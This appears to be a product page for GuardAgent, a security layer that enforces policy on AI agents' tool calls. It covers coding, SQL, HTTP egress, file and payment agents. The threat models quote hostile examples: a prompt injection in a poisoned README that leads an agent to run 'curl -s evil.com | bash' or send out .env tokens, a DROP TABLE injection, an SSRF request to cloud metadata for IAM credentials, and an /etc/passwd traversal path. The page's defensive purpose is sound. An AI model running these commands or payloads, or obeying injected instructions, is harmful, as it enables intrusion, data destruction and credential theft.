DEPLOYMENT ARCHITECTURES

Practical Security Use Cases

Explore how GuardAgent applies deterministic policy boundaries across typical developer and enterprise agent deployments.

DEVELOPER INFRASTRUCTURE

1. AI Coding & Software Engineering Agents

COMMAND ISOLATION

Autonomous programming agents (e.g. PR reviewers, automated bug fixers, CLI assistants) frequently require tool access to execute shell commands, run test runners, and inspect repository files.

THREAT MODEL:

Indirect prompt injection inside an untrusted repository (e.g., a poisoned README or commit message) instructs the coding agent to run curl -s evil.com | bash or exfiltrate private .env tokens.

GUARDAGENT DEFENSE:

GuardAgent enforces an explicit command whitelist (e.g. permitting only git status, npm test), rejects command chaining operators (;, &&, |), and blocks read access to dotfiles.

DATA GOVERNANCE

2. Natural Language Database & SQL Query Tools

AST PARSER ENFORCEMENT

Text-to-SQL agents convert user questions into database queries. Non-deterministic queries can easily cause unintended table mutations or unthrottled data dumping.

THREAT MODEL:

User asks a maliciously phrased prompt causing the LLM to output SELECT * FROM customers WHERE 1=1; DROP TABLE audit_log; or unbounded scans causing denial of service.

GUARDAGENT DEFENSE:

Policy parses query AST before execution: permits only SELECT statements, checks table access whitelists, and enforces a mandatory LIMIT 50 ceiling on returned records.

EGRESS SECURITY

3. External API Actions & Webhook Triggers

SSRF EGRESS GUARD

Agents tasked with lead enrichment, web searching, or external webhook dispatching need to issue outbound HTTP requests to external web addresses.

THREAT MODEL:

Server-Side Request Forgery (SSRF) targeting cloud instance metadata (http://169.254.169.254/latest/meta-data/) to extract IAM instance profile credentials.

GUARDAGENT DEFENSE:

GuardAgent checks destination IP and hostname against prohibited CIDR ranges (RFC 1918 private subnets, link-local addresses, loopback). Egress to metadata endpoints is blocked with a CRITICAL risk verdict.

STORAGE ACCESS

4. File & File System Operations

DIRECTORY JAIL

File management agents create, update, or read documents on local file systems or cloud object storage buckets.

THREAT MODEL:

Path traversal payloads (e.g. ../../../../etc/passwd) attempting to escape assigned sandboxes and read host OS configurations.

GUARDAGENT DEFENSE:

GuardAgent canonicalizes path parameters before validation, rejecting any relative navigation resolving outside the designated base directory.

FINANCIAL OPERATIONS

5. Autonomous Financial & Payment Operations

DUAL-CONTROL WORKFLOW

Customer support or operations agents permitted to execute refunds, adjust account balances, or trigger vendor payouts.

THREAT MODEL:

Agent misinterpretation or user prompt manipulation instructing the agent to transfer excessive funds (e.g. $14,500.00) without oversight.

GUARDAGENT DEFENSE:

Policy enforces an autonomous limit of $100. Any transaction above $100 up to $50,000 halts with REQUIRE_APPROVAL, requiring an authorized human token before funds can be disbursed.

CUSTOM EXTENSIONS

6. Custom Tool Registrations & Framework Integration

REST GATEWAY PROXY

Whether you build agents with LangChain, AutoGen, CrewAI, or bespoke Python/TypeScript scripts, GuardAgent provides a language-agnostic REST interface.

Developers register tool parameter schemas and policy definitions in GuardAgent. The agent calls POST /api/requests/evaluate as part of its tool-calling loop, ensuring compliance regardless of the underlying LLM provider.
